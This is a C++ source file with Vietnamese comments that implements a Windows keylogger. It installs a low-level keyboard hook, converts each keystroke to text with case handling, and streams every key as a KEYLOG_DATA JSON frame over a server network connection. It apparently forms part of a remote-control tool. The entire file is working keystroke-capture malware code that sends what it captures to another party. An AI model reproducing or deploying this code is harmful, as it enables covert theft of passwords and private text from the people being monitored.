#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <atomic> // Dùng biến atomic để tránh xung đột luồng
#include "../Network/ServerNetwork.h"
#include "../ThirdParty/json.hpp"

using namespace std;
using json = nlohmann::json;

// --- BIẾN TOÀN CỤC ---
HHOOK hHook = NULL;
ServerNetwork* g_Server = NULL;
// Dùng atomic để kiểm tra trạng thái an toàn hơn
std::atomic<bool> isRunning(false); 
DWORD hookThreadId = 0;

class Keylogger {
private:
    // HÀM XỬ LÝ SỰ KIỆN PHÍM
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        // Chỉ xử lý khi nCode >= 0 và LÀ SỰ KIỆN NHẤN PHÍM (WM_KEYDOWN)
        // WM_SYSKEYDOWN: Bắt thêm cả tổ hợp phím Alt + ...
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            
            KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = kbd->vkCode;
            
            // --- LỌC BỎ SỰ KIỆN LẶP (AUTOREPEAT) ---
            // Nếu bạn giữ phím lâu, nó sẽ gửi liên tục. Dòng này sẽ chặn nó nếu bạn muốn.
            // Nếu muốn bắt cả việc giữ phím thì xóa dòng if dưới này đi.
            // if (kbd->flags & LLKHF_ALTDOWN) { /* Alt đang giữ */ }

            string keyName = "";

            // 1. Xử lý các phím đặc biệt
            if (vkCode == VK_RETURN) keyName = "[Enter]";
            else if (vkCode == VK_BACK) keyName = "[BS]";
            else if (vkCode == VK_SPACE) keyName = " ";
            else if (vkCode == VK_TAB) keyName = "[Tab]";
            else if (vkCode == VK_ESCAPE) keyName = "[Esc]";
            else if (vkCode >= 0x30 && vkCode <= 0x39) { // Số 0-9
                keyName = string(1, (char)vkCode);
            }
            else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Chữ A-Z
                char key = (char)MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
                
                // Check Shift / CapsLock để viết hoa thường
                bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                if (!isShift && !isCaps) key = tolower(key);
                if (isShift && isCaps) key = tolower(key);

                keyName = string(1, key);
            }
            else {
                // Các ký tự khác
                char key = (char)MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
                if (key != 0) keyName = string(1, key);
            }

            // 2. Gửi về Server
            if (!keyName.empty() && g_Server != NULL && isRunning) {
                // In ra console server để debug (Nếu thấy in 1 lần là OK)
                cout << keyName; 

                json j;
                j["type"] = "KEYLOG_DATA";
                j["payload"] = { {"keyStroke", keyName} };
                g_Server->SendFrame(j.dump());
            }
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }

    // VÒNG LẶP HOOK
    static void Loop() {
        hookThreadId = GetCurrentThreadId();
        
        // Cài đặt Hook
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        
        if (hHook == NULL) {
            cout << ">> [LOI] Khong the cai dat Hook!" << endl;
            isRunning = false;
            return;
        }

        // Message Pump
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Gỡ Hook sạch sẽ khi vòng lặp kết thúc
        if (hHook) {
            UnhookWindowsHookEx(hHook);
            hHook = NULL;
        }
        isRunning = false;
    }

public:
    static void Start(ServerNetwork& server) {
        // --- FIX LỖI QUAN TRỌNG: CHẶN START NHIỀU LẦN ---
        if (isRunning) {
            cout << ">> Keylogger dang chay roi (bo qua lenh Start)." << endl;
            return;
        }

        g_Server = &server;
        isRunning = true;

        thread t(Loop);
        t.detach();
        cout << ">> Keylogger: DA BAT." << endl;
    }

    static void Stop() {
        if (!isRunning) return;

        // Gửi lệnh hủy vòng lặp
        if (hookThreadId != 0) {
            PostThreadMessage(hookThreadId, WM_QUIT, 0, 0);
        }
        
        // Đợi 1 chút để thread kịp hủy hook
        Sleep(100);
        isRunning = false;
        g_Server = NULL;
        cout << ">> Keylogger: DA TAT." << endl;
    }
};